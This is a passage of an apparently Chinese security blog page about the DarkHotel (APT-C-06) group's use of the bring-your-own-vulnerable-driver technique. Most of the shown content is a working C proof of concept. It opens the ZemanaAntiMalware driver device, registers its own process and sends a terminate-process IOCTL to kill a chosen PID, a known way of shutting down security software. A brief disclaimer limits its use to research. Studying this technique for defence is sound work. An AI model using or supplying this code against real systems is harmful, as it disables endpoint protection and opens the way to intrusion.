class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 尝试打开设备</span></span><br><span class="line">    HANDLE hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">        <span class="string">L&quot;\\\\.\\ZemanaAntiMalware&quot;</span>,  <span class="comment">// 设备名称</span></span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open device. Error: %lu\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一步：注册当前进程 (IOCTL_REGISTER_PROCESS)</span></span><br><span class="line">    DWORD currentPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line"></span><br><span class="line">    BOOL registerResult = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">        hDevice,</span><br><span class="line">        <span class="number">0x80002010</span>,         <span class="comment">// IOCTL_REGISTER_PROCESS</span></span><br><span class="line">        &amp;currentPid,        <span class="comment">// 输入：当前进程PID</span></span><br><span class="line">        <span class="built_in">sizeof</span>(currentPid), <span class="comment">// 输入大小</span></span><br><span class="line">        <span class="literal">NULL</span>,               <span class="comment">// 无输出</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!registerResult) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to register process. Error: %lu\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process registered successfully!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二步：发送终止进程请求 (IOCTL_TERMINATE_PROCESS)</span></span><br><span class="line">    DWORD inputBuffer[<span class="number">2</span>];</span><br><span class="line">    inputBuffer[<span class="number">0</span>] = <span class="number">2364</span>;  <span class="comment">// 要终止的进程ID（PID）</span></span><br><span class="line">    inputBuffer[<span class="number">1</span>] = <span class="number">1</span>;     <span class="comment">// 1=等待进程终止，0=不等待</span></span><br><span class="line"></span><br><span class="line">    BOOL terminateResult = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">        hDevice,</span><br><span class="line">        <span class="number">0x80002048</span>,         <span class="comment">// IOCTL_TERMINATE_PROCESS</span></span><br><span class="line">        inputBuffer,        <span class="comment">// 输入缓冲区</span></span><br><span class="line">        <span class="built_in">sizeof</span>(inputBuffer),<span class="comment">// 输入缓冲区大小（8字节）</span></span><br><span class="line">        <span class="literal">NULL</span>,               <span class="comment">// 输出缓冲区（不需要）</span></span><br><span class="line">        <span class="number">0</span>,                  <span class="comment">// 输出缓冲区大小</span></span><br><span class="line">        &amp;bytesReturned,     <span class="comment">// 返回的字节数</span></span><br><span class="line">        <span class="literal">NULL</span>                <span class="comment">// 重叠I/O结构（通常NULL）</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!terminateResult) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to terminate process. Error: %lu\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Process termination request sent successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码纯本人安全研究，为了增强网络安全，禁止用于恶意行为操作，如果产生不良后果，与本人无关。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E5%A6%82%E4%B8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">链接如下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BYOVD%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">BYOVD技术</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&text=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&is_video=false&description=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析&body=Check out this article: http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&name=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&t=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    CHANGMEN
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
